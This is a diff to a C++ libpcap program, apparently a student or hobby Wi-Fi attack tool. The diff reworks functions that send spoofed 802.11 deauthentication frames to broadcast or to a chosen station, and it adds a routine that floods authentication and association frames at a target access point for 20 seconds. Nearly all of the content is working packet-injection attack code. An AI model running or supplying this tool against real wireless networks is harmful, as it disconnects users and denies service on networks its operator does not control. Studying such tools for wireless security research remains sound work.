@@ -1,6 +1,4 @@
 #include "packet.h"
-//AP MAC ADDR : argv[2], 88:88:88:88:88:88
-//Station MAC ADDR : argv[3] 99:99:99:99:99:99
 
 void ApBroadcast(pcap_t* handle, char* apMac){
     //Ap -> BroadCast 0xc000
@@ -19,13 +17,13 @@ void ApBroadcast(pcap_t* handle, char* apMac){
         send[i] = static_cast<uint8_t>(value);
     }
 
-    struct last packet;
+    struct Deauth packet;
 
     //deauth
     packet.deauth.frame_control = 0x00c0;
     
     for(int i = 0;i<6;i++){
-        packet.deauth.readdr1[i] = 0xff;
+        packet.deauth.des[i] = 0xff;
     }
 
     for(int i = 0;i<6;i++){
@@ -70,21 +68,15 @@ void APUnicast(pcap_t* handle, char* apMac, char* stationMac){
         des[i] = static_cast<uint8_t>(value);
     }
 
-    struct last packet;
+    struct Deauth packet;
 
     //deauth
     packet.deauth.frame_control = 0x00c0;
     
     for(int i = 0;i<6;i++){
-        packet.deauth.readdr1[i] = des[i];
-    }
-
-    for(int i = 0;i<6;i++){
-        packet.deauth.sourceaddr4[i] = send[i]; 
-    }
-
-    for(int i = 0;i<6;i++){
+        packet.deauth.des[i] = des[i];
         packet.deauth.bssid[i] = send[i];
+        packet.deauth.sourceaddr4[i] = send[i];
     }
 
     packet.fixed.ReasonCode = 0x0007;
@@ -126,24 +118,18 @@ void StationUnicast(pcap_t* handle, char* apMac, char* stationMac){
         send[i] = static_cast<uint8_t>(value);
     }
 
-    struct last packet;
+    struct Deauth packet;
 
     //deauth
-    packet.deauth.frame_control = 0x10c0;
+    packet.deauth.frame_control = 0x00c0;
     
     for(int i = 0;i<6;i++){
-        packet.deauth.readdr1[i] = des[i];
-    }
-
-    for(int i = 0;i<6;i++){
-        packet.deauth.sourceaddr4[i] = send[i]; 
-    }
-
-    for(int i = 0;i<6;i++){
+        packet.deauth.des[i] = des[i];
+        packet.deauth.sourceaddr4[i] = send[i];
         packet.deauth.bssid[i] = des[i];
     }
 
-    packet.fixed.ReasonCode = 0x0003;
+    packet.fixed.ReasonCode = 0x0007;
 
     auto start = std::chrono::steady_clock::now();
     auto end = start;
@@ -156,8 +142,66 @@ void StationUnicast(pcap_t* handle, char* apMac, char* stationMac){
     } while(std::chrono::duration_cast<std::chrono::seconds>(end - start).count() < 20);
 }
 
-void authentication(pcap_t* handle, char* apMac, char* stationMac){
+void authentication(pcap_t* handle, char* apMac, char* stationMac,char* ssid){
+    //Station -> AP
+    uint8_t send[6];
+    uint8_t des[6];
+    std::istringstream apMacStream(apMac);
+    std::istringstream stationMacStream(stationMac);
+    int value;
+    char colon;
+
+    for (int i = 0; i < 6; ++i) {
+        apMacStream >> std::hex >> value >> colon;
+        des[i] = static_cast<uint8_t>(value);
+    }
+
+    value = 0;
+    colon = 0;
+
+    for (int i = 0; i < 6; ++i) {
+        stationMacStream >> std::hex >> value >> colon;
+        send[i] = static_cast<uint8_t>(value);
+    }
+
+    struct Auth packet;
+    struct Asso assopacket;
     
+    
+    packet.deauth.frame_control = 0xb0;
+    assopacket.deauth.frame_control = 0x00;
+    
+    for(int i = 0;i<6;i++){
+        packet.deauth.des[i] = des[i];
+        packet.deauth.sourceaddr4[i] = send[i];
+        packet.deauth.bssid[i] = des[i];
+
+        assopacket.deauth.des[i] = des[i];
+        assopacket.deauth.sourceaddr4[i] = send[i]; 
+        assopacket.deauth.bssid[i] = des[i];
+    }
+
+    size_t ssidLength = strlen(ssid);
+    assopacket.data.length = ssidLength;
+    std::vector<uint8_t> assoPacketData(sizeof(assopacket) + ssidLength);
+
+    memcpy(assoPacketData.data(), &assopacket, sizeof(assopacket));
+    memcpy(assoPacketData.data() + sizeof(assopacket), ssid, ssidLength);
+
+    auto start = std::chrono::steady_clock::now();
+    auto end = start;
+    do {
+        if (pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
+            fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
+        }
+
+        if (pcap_sendpacket(handle, assoPacketData.data(), assoPacketData.size()) != 0) {
+            fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
+        }
+
+        fprintf(stderr, "send\n");
+        end = std::chrono::steady_clock::now();
+    } while (std::chrono::duration_cast<std::chrono::seconds>(end - start).count() < 20);
 }
 
 int main(int argc, char* argv[]){
@@ -177,8 +221,8 @@ int main(int argc, char* argv[]){
             APUnicast(handle, argv[2], argv[3]);
             StationUnicast(handle, argv[2], argv[3]);
             break;
-        case 5:
-            authentication(handle, argv[2], argv[3]);
+        case 6:
+            authentication(handle, argv[2], argv[3],argv[5]);
             break;
         default:
             usage();
